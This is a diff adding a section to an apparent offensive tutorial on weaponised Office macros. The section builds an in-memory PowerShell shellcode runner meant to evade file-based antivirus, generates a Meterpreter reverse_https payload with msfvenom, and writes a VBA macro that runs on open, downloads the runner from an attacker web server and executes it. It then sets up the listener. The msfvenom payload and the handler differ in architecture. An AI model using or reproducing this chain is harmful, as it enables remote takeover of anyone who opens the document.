@@ -115,3 +115,102 @@ Sub AutoOpen()
     MyMacro
 End Sub
 ```
+
+### A Blend of the 2
+
+Keeping things entirely in the memory of the running application is dubiously stable, however downloading and running Powercat to spawn our shell gets zero points for subtlety. There is a middle ground. We can download a payload from our attack machine that will consist of a Powershell script, however this script will be more subtle than Powercat, it will make use of calls to Win32 APIs and DelegateTypes in C\# to keep the resulting exploit entirely in memory, avoiding writing to any files. It will spawn Powershell processes, so may be flagged as suspicious by Defender, but it ought to invisible to a file-based Antivirus.
+
+The following Powershell will serve as our payload, save it as `run.ps1` in a directory from which we're serving a web server:
+```powershell
+function LookupFunc {
+	Param ($moduleName, $functionName)
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+        Where-Object {
+            $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')
+        })
+        .GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+	$type = [AppDomain]::CurrentDomain
+        .DefineDynamicAssembly(
+            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
+        )
+        .DefineDynamicModule('InMemoryModule', $false)
+        .DefineType(
+            'MyDelegateType',
+            'Class, Public, Sealed, AnsiClass, AutoClass',
+            [System.MulticastDelegate]
+        )
+    $type
+        .DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func)
+        .SetImplementationFlags('Runtime, Managed')
+    $type
+        .DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func)
+        .SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+[Byte[]] $buf = 0x0,0x0,0x0,0x0,0x0,0x0...
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+```
+
+Substitute the `[Byte[]] $buf = 0x0,0x0,0x0,0x0,0x0,0x0...` with the output from the following:
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 EXITFUNC=thread -f ps1
+```
+
+Finally, our macro should look like so. Very similar to the original, but a slight variant to give us more versions of the VBA to experiment with should the exploit not work for any reason.
+```vba
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.0.1/run.ps1') | IEX"
+    Shell str, vbHide
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+```
+
+Before executing, don't forget to start the web server:
+```bash
+python3 -m http.server 80
+```
+and also don't forget to get the staged meterpreter listener ready:
+```bash
+sudo msfconsole -q
+```
+```bash
+use multi/handler
+```
+```bash
+set payload windows/x64/meterpreter/reverse_https
+```
+```bash
+set lhost 192.168.0.1
+```
+```bash
+set lport 443
+```
+```bash
+exploit
+```
